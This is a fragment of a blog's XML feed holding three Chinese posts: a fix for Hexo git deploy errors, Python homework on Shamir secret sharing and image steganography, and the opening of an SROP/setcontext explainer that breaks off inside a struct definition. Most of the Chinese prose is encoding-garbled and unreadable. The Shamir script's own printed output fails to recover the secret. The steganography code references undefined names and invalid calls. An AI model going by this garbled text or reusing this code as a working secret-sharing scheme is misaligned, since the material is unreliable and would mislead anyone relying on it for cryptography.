(/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•"><a href="#è§£å†³æ–¹æ³•" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><p>ä¸€ã€æ‰“å¼€vscodeè®¾ç½®ç•Œé¢ï¼Œæœç´¢git.terminal Authenticationï¼Œå°†ä»–å‰é¢çš„ âˆš å»æ‰</p><p><img src="/img/article/error128/vscode1.png" alt="image-20220607164521802"></p><p>äºŒã€crtl + shift + p æ‰“å¼€æœç´¢æ¡†ï¼Œæœç´¢reload windowå¹¶è¿è¡Œ</p><p><img src="/img/article/error128/vscode2.png" alt="image-20220607164739265"></p><p>ä¸‰ã€å†æ¬¡å°è¯•hexo gï¼Œè§£å†³æˆåŠŸ</p><p><img src="/img/article/error128/vscode3.png" alt="image-20220607164850847"></p><h2 id="é”™è¯¯ä¿¡æ¯äºŒ"><a href="#é”™è¯¯ä¿¡æ¯äºŒ" class="headerlink" title="é”™è¯¯ä¿¡æ¯äºŒ"></a>é”™è¯¯ä¿¡æ¯äºŒ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal: unable to access <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span>: gnutls_handshake() failed: Error <span class="hljs-keyword">in</span> the pull <span class="hljs-keyword">function</span>.<br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="è§£å†³æ–¹æ³•-1"><a href="#è§£å†³æ–¹æ³•-1" class="headerlink" title="è§£å†³æ–¹æ³•"></a>è§£å†³æ–¹æ³•</h3><p>æ‰“å¼€_config.ymlæ–‡ä»¶ï¼Œæ›´æ”¹httpsä»“åº“åœ°å€ä¸ºsshåœ°å€,é…ç½®sshå¯†é’¥å³å¯</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span><span class="hljs-string">https://github.com/YourName/YourName.github.io.git(ä¸è¦ä½¿ç”¨è¿™ä¸ª)</span><br>  <span class="hljs-string">git@github.com:YourName/YourName.github.io.git(ç”¨è¿™ä¸ª)</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pythonå®ç°shamiråŠ å¯†å’Œå›¾åƒåŠ å¯†éšå†™</title>
    <link href="/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/"/>
    <url>/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ç½‘ç»œä¿¡æ¯å®‰å…¨ä¸Šæœºä½œä¸šç½¢äº†ï¼Œäººå·²ç»éº»äº†</p></blockquote><h2 id="shamirç§˜å¯†å…±äº«åè®®"><a href="#shamirç§˜å¯†å…±äº«åè®®" class="headerlink" title="shamirç§˜å¯†å…±äº«åè®®"></a>shamirç§˜å¯†å…±äº«åè®®</h2><h3 id="åŠ å¯†è¿‡ç¨‹"><a href="#åŠ å¯†è¿‡ç¨‹" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p>å‡è®¾æœ‰ç§˜å¯†Sè¦ä¿æŠ¤ï¼Œä»»æ„å–t-1ä¸ªéšæœºæ•°ï¼Œæ„é€ å¦‚ä¸‹å¤šé¡¹å¼ï¼š <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[å…¬å¼]"> ï¼Œå…¶ä¸­ï¼Œ <img src="https://www.zhihu.com/equation?tex=a_0=S" alt="[å…¬å¼]"> ï¼Œæ‰€æœ‰è¿ç®—å‡åœ¨æœ‰æœ‰é™åŸŸä¸­è¿›è¡Œã€‚</p><ul><li>å–ä»»æ„nä¸ªæ•°ï¼Œ <img src="https://www.zhihu.com/equation?tex=x_1,x_2,%5Ccdots,x_n" alt="[å…¬å¼]"> åˆ†åˆ«å¸¦å…¥å¤šé¡¹å¼ï¼Œå¾—åˆ° <img src="https://www.zhihu.com/equation?tex=f(x_1),f(x_2),%5Ccdots+f(x_n)" alt="[å…¬å¼]"> ã€‚</li><li>å°† <img src="https://www.zhihu.com/equation?tex=(x_1,f(x_1)),%5Ccdots+,(x_n,f(x_n))" alt="[å…¬å¼]"> åˆ†å‘ç»™nä¸ªæœåŠ¡å™¨ä¸Šã€‚</li></ul><h3 id="è§£å¯†è¿‡ç¨‹"><a href="#è§£å¯†è¿‡ç¨‹" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><p>ä»ä»»æ„tä¸ªæœåŠ¡å™¨ä¸Šå–å¾—æ•°æ®ï¼Œå‡è®¾å–å¾— <img src="https://www.zhihu.com/equation?tex=(x_1,y_1),%5Ccdots+,(x_t,y_t)" alt="[å…¬å¼]"> ï¼Œå¸¦å…¥å¹¶æ±‚è§£å¤šé¡¹å¼ç³»æ•°ï¼›<br><img src="https://www.zhihu.com/equation?tex=%5Cbegin%7Baligned%7D+a_0+a_1x_1+%5Ccdots+,a_%7Bt-1%7Dx_1%5E%7Bt-1%7D=y_1+%5C%5C+a_0+a_1x_2+%5Ccdots+,a_%7Bt-1%7Dx_2%5E%7Bt-1%7D=y_2+%5C%5C+%5Ccdots+%5C%5C+a_0+a_1x_t+%5Ccdots+,a_%7Bt-1%7Dx_%7Bt%7D%5E%7Bt-1%7D=y_%7Bt%7D+%5C%5C+%5Cend%7Baligned%7D" alt="[å…¬å¼]"><br>ç”¨çŸ©é˜µä¹˜æ³•è¡¨ç¤ºä¸ºï¼š<br><img src="/img/article/shamir/matrix.png" alt="img"><br>åœ¨æ±‚å¾— <img src="https://www.zhihu.com/equation?tex=a_0,a_1,%5Ccdots,a_%7Bt-1%7D" alt="[å…¬å¼]"> ä¹‹åä¾¿å¯ä»¥æ„é€ å‡ºå¤šé¡¹å¼ <img src="https://www.zhihu.com/equation?tex=f(x)=a_0+a_1x+a_2x%5E2+%5Ccdots+a_%7Bt-1%7Dx%5E%7Bt-1%7D" alt="[å…¬å¼]"></p><p>å°† <img src="https://www.zhihu.com/equation?tex=x=0" alt="[å…¬å¼]"> å¸¦å…¥åˆ°å¤šé¡¹å¼ä¸­ï¼Œå¯ä»¥æ±‚çš„åŸç§˜å¯† <img src="https://www.zhihu.com/equation?tex=S=a_0" alt="[å…¬å¼]"></p><h3 id="ç®—æ³•å®ç°"><a href="#ç®—æ³•å®ç°" class="headerlink" title="ç®—æ³•å®ç°"></a>ç®—æ³•å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br><span class="hljs-keyword">from</span> decimal <span class="hljs-keyword">import</span> Decimal<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-comment">##æµ‹è¯•æ•°æ®</span><br><span class="hljs-built_in">max</span> = <span class="hljs-number">1000000</span><br>t = <span class="hljs-number">5</span><br>n = <span class="hljs-number">8</span><br>secret = <span class="hljs-number">31298123678</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;before:&#x27;</span>,secret)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ENCRYPTING.......&#x27;</span>)<br><span class="hljs-comment">##æ„é€ å¤šé¡¹å¼f(x)</span><br>fx = [random.randrange(<span class="hljs-number">0</span>,<span class="hljs-built_in">max</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t-<span class="hljs-number">1</span>)]<br>fx.append(secret)<br><br><span class="hljs-comment">##ä»»å–nä¸ªxï¼Œåˆ†åˆ«å¸¦å…¥å¤šé¡¹å¼ï¼Œäº§ç”Ÿå¯¹åº”çš„(x,y)</span><br>share = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>    x = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span> <br>    <span class="hljs-keyword">for</span> idx, value <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fx[::-<span class="hljs-number">1</span>]):<br>        y += value * x**idx<br>    share.append((x,y))         <span class="hljs-comment">##æ¯äººåˆ†åˆ°çš„(x,y)åºåˆ—</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;share:(&#x27;</span>,x,<span class="hljs-string">&#x27;,&#x27;</span>,y,<span class="hljs-string">&#x27;)&#x27;</span>)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;DECRYPTING......&#x27;</span>)<br><span class="hljs-comment">##ä»»å–tä¸ª(x,y)åºåˆ—,å¹¶è§£å¯†</span><br>key = random.sample(share,t)<br><span class="hljs-built_in">sum</span> =<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i, key_i <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>    x_i,y_i = key_i<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;key:(&#x27;</span>,x_i,<span class="hljs-string">&#x27;,&#x27;</span>,y_i,<span class="hljs-string">&#x27;)&#x27;</span>)<br>    temp = Decimal(<span class="hljs-number">1</span>)<br>    <br>    <span class="hljs-keyword">for</span> j, key_j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(key):<br>        x_j,y_j = key_j<br>        <span class="hljs-keyword">if</span> i != j:<br>            temp *= Decimal(Decimal(x_j)/Decimal(x_j-x_i))<br>    temp *= y_i<br>    <span class="hljs-built_in">sum</span> += Decimal(temp)<br><br><span class="hljs-built_in">sum</span> = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">round</span>(Decimal(<span class="hljs-built_in">sum</span>),<span class="hljs-number">0</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;after:&#x27;</span>,<span class="hljs-built_in">sum</span>)<br></code></pre></td></tr></table></figure><h4 id="è¿è¡Œç¤ºèŒƒ"><a href="#è¿è¡Œç¤ºèŒƒ" class="headerlink" title="è¿è¡Œç¤ºèŒƒ"></a>è¿è¡Œç¤ºèŒƒ</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€[loorain@ubuntu] - [~/crypto/shamir] - [2304]shamir<br>â””â”€[$] python3 shamir.py                                                                                                                                                                                             [20:33:27]<br>before: 31298123678<br>ENCRYPTING.......<br>share:( 385490 , 19613871609040056923504678528 )<br>share:( 208439 , 1676593182288704748621405212 )<br>share:( 111980 , 139661059121519203627546778 )<br>share:( 287787 , 6092505271995476798344376612 )<br>share:( 57978 , 10036212148635231635583656 )<br>share:( 8027 , 3687858811716396682052 )<br>share:( 640969 , 149919642500298401999699916572 )<br>share:( 444105 , 34550423234050839227167648028 )<br>DECRYPTING......<br>key:( 444105 , 34550423234050839227167648028 )<br>key:( 111980 , 139661059121519203627546778 )<br>key:( 208439 , 1676593182288704748621405212 )<br>key:( 287787 , 6092505271995476798344376612 )<br>key:( 385490 , 19613871609040056923504678528 )<br>after: 31298123800<br></code></pre></td></tr></table></figure><h2 id="å›¾åƒåŠ å¯†éšå†™"><a href="#å›¾åƒåŠ å¯†éšå†™" class="headerlink" title="å›¾åƒåŠ å¯†éšå†™"></a>å›¾åƒåŠ å¯†éšå†™</h2><blockquote><p>è¿™é‡Œç”¨0-255çš„çŸ©é˜µæ¨¡æ‹Ÿç°åº¦å›¾åƒ</p></blockquote><h3 id="åŠ å¯†è¿‡ç¨‹-1"><a href="#åŠ å¯†è¿‡ç¨‹-1" class="headerlink" title="åŠ å¯†è¿‡ç¨‹"></a>åŠ å¯†è¿‡ç¨‹</h3><p><img src="/img/article/shamir/cry.png" alt="åŠ å¯†ç¤ºæ„å›¾"></p><p>éšæœºç”Ÿæˆ O å’Œ Sï¼Œå¹¶è®¡ç®— d å’Œ si</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">S_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">10</span>,<span class="hljs-number">10</span>))<br>O_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">256</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>Q_img = rd.randint(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,(<span class="hljs-number">20</span>,<span class="hljs-number">20</span>))<br>m = number.getPrime(<span class="hljs-number">4</span>) <span class="hljs-comment">#éšæœºç”Ÿæˆä¸€ä¸ªç´ æ•°m</span><br><br>d = O_img % m<br>S_i = S_img % m<br></code></pre></td></tr></table></figure><p>ç”ŸæˆQ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">20</span>):<br>        Q_img[i,j] = math.floor(O_img[i,j] / m) * m<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆy &#x3D; f(x),æ±‚å¾—yä¸Qç›¸åŠ çš„åˆ°nä¸ªOi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">O_i = []<br><span class="hljs-comment">##ç”Ÿæˆy = f(x),æ±‚å¾—yä¸Qç›¸åŠ çš„åˆ°nä¸ªOi</span><br><span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">400</span>):<br>    key = random.randrange(<span class="hljs-number">1</span>,<span class="hljs-built_in">max</span>)<br>    y = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            y += S_i[i,j]* (key ** (i*<span class="hljs-number">10</span>+j))<br>    y += d[n] * (key ** (i*<span class="hljs-number">10</span>+j))<br>    O_i.append((Q_img + y)) <br></code></pre></td></tr></table></figure><h3 id="è§£å¯†è¿‡ç¨‹-1"><a href="#è§£å¯†è¿‡ç¨‹-1" class="headerlink" title="è§£å¯†è¿‡ç¨‹"></a>è§£å¯†è¿‡ç¨‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    Q_img.append((O_i[i, <span class="hljs-number">0</span>] // m) * m)<br>    so1.append(d[i] - (O_i[i, <span class="hljs-number">0</span>] // m) * m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d.append(Q_img[i])<br>sol = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    d1 = np(<span class="hljs-number">0</span>,m,(<span class="hljs-number">10</span>, <span class="hljs-number">10</span>)) <br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            d1[j, k] = S_img[i, j]**k<br>    sol.append(d1.solve_right(O_img[i])[<span class="hljs-number">0</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    <span class="hljs-keyword">assert</span> sol[i]&gt;m<br>solve = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">101</span>):<br>    solve.append(so1[i]+Q_img[i])<br><span class="hljs-built_in">print</span>(solve == d)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>setcontext &amp; SROP</title>
    <link href="/2022/06/05/srop/"/>
    <url>/2022/06/05/srop/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>SROP(Sigreturn Oriented Programming) äº 2014 å¹´è¢« Vrije Universiteit Amsterdam çš„ Erik Bosman æå‡ºï¼Œå…¶ç›¸å…³ç ”ç©¶<strong>Framing Signals â€” A Return to Portable Shellcode</strong> å…¶ä¸­ç›¸å…³çš„ paper ä»¥åŠå¦‚ä¸‹ï¼š<br><a href="https://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf">paper</a></p></blockquote><h2 id="æœºåˆ¶è¯¦è§£"><a href="#æœºåˆ¶è¯¦è§£" class="headerlink" title="æœºåˆ¶è¯¦è§£"></a>æœºåˆ¶è¯¦è§£</h2><p>signal æœºåˆ¶æ˜¯ç±» unix ç³»ç»Ÿä¸­è¿›ç¨‹ä¹‹é—´ç›¸äº’ä¼ é€’ä¿¡æ¯çš„ä¸€ç§æ–¹æ³•ã€‚ä¸€èˆ¬ï¼Œæˆ‘ä»¬ä¹Ÿç§°å…¶ä¸ºè½¯ä¸­æ–­ä¿¡å·ï¼Œæˆ–è€…è½¯ä¸­æ–­ã€‚æ¯”å¦‚è¯´ï¼Œè¿›ç¨‹ä¹‹é—´å¯ä»¥é€šè¿‡ç³»ç»Ÿè°ƒç”¨ kill æ¥å‘é€è½¯ä¸­æ–­ä¿¡å·ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œä¿¡å·æœºåˆ¶å¸¸è§çš„æ­¥éª¤å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/article/srop/srop1.png" alt="Untitled"></p><ol><li>å†…æ ¸å‘æŸä¸ªè¿›ç¨‹å‘é€ signal æœºåˆ¶ï¼Œè¯¥è¿›ç¨‹ä¼šè¢«æš‚æ—¶æŒ‚èµ·ï¼Œè¿›å…¥å†…æ ¸æ€ã€‚</li><li>å†…æ ¸ä¼šä¸ºè¯¥è¿›ç¨‹ä¿å­˜ç›¸åº”çš„ä¸Šä¸‹æ–‡ï¼Œ<strong>ä¸»è¦æ˜¯å°†æ‰€æœ‰å¯„å­˜å™¨å‹å…¥æ ˆä¸­ï¼Œä»¥åŠå‹å…¥ signal ä¿¡æ¯ï¼Œä»¥åŠæŒ‡å‘ <code>sigreturn</code> çš„ç³»ç»Ÿè°ƒç”¨åœ°å€</strong>ã€‚æ­¤æ—¶æ ˆçš„ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬ç§° <code>ucontext</code> ä»¥åŠ <code>siginfo</code> è¿™ä¸€æ®µä¸º <strong>Signal Frame</strong>ã€‚<strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯åœ¨ç”¨æˆ·è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„ã€‚</strong>ä¹‹åä¼šè·³è½¬åˆ°æ³¨å†Œè¿‡çš„ signal handler ä¸­å¤„ç†ç›¸åº”çš„ signalã€‚å› æ­¤ï¼Œå½“ signal handler æ‰§è¡Œå®Œä¹‹åï¼Œå°±ä¼šæ‰§è¡Œ <code>sigreturn</code> ä»£ç ã€‚</li><li><code>signal handler</code> è¿”å›åï¼Œå†…æ ¸ä¸ºæ‰§è¡Œ <code>sigreturn</code> ç³»ç»Ÿè°ƒç”¨ï¼Œä¸ºè¯¥è¿›ç¨‹æ¢å¤ä¹‹å‰ä¿å­˜çš„ä¸Šä¸‹æ–‡ï¼Œå…¶ä¸­åŒ…æ‹¬å°†æ‰€æœ‰å‹å…¥çš„å¯„å­˜å™¨ï¼Œé‡æ–° pop å›å¯¹åº”çš„å¯„å­˜å™¨ï¼Œæœ€åæ¢å¤è¿›ç¨‹çš„æ‰§è¡Œã€‚å…¶ä¸­ï¼Œ32 ä½çš„ <code>sigreturn</code> çš„è°ƒç”¨å·ä¸º 77ï¼Œ64 ä½çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 15ã€‚</li></ol><p><img src="/img/article/srop/srop2.png" alt="Untitled"></p><p>ä¸Šè¿°è°ˆåˆ°çš„ä»æ ˆä¸­POPå‡ºå¯„å­˜å™¨å†…å®¹çš„è¿‡ç¨‹ç”± <code>setcontext</code> å‡½æ•°å®ç°ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/article/srop/srop3.png" alt="Untitled"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä»æŒ‡ä»¤<code>mov rsp, [rdi+0A0h]</code>å¼€å§‹ï¼Œä¾¿æ˜¯ä¸€è¿ä¸²å¯¹äºå¯„å­˜å™¨çš„æ¢å¤æ“ä½œã€‚è€Œä¸”ç»“æ„ç”±Signal Frameç»“æ„ä½“å®ç°ï¼Œä»¥ä¸‹æ˜¯ç»“æ„æºç </p><p><strong>X86</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sigcontext</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> gs, __gsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> fs, __fsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> es, __esh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ds, __dsh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esi;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ebx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> edx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ecx;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eax;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> trapno;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> err;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eip;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> cs, __csh;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> eflags;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> esp_at_signal;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> ss, __ssh;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span> * <span class="hljs-title">fpstate</span>;</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> oldmask;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> cr2;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>X64</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">fpstate</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-comment">/* FPU environment matching the 64-bit FXSAVE layout.  */</span><br>  <span class="hljs-type">__uint16_t</span>        cwd;<br>  <span class="hljs-type">__uint16_t</span>        swd;<br>  <span class="hljs-type">__uint16_t</span>        ftw;<br>  <span class="hljs-type">__uint16_t</span>        fop;<br>  <span class="hljs-type">__uint64_t</span>        rip;<br>  <span class="hljs-type">__uint64_t</span>        rdp;<br>  <span class="hljs-type">__uint32_t</span>        mxcsr;<br>  <span 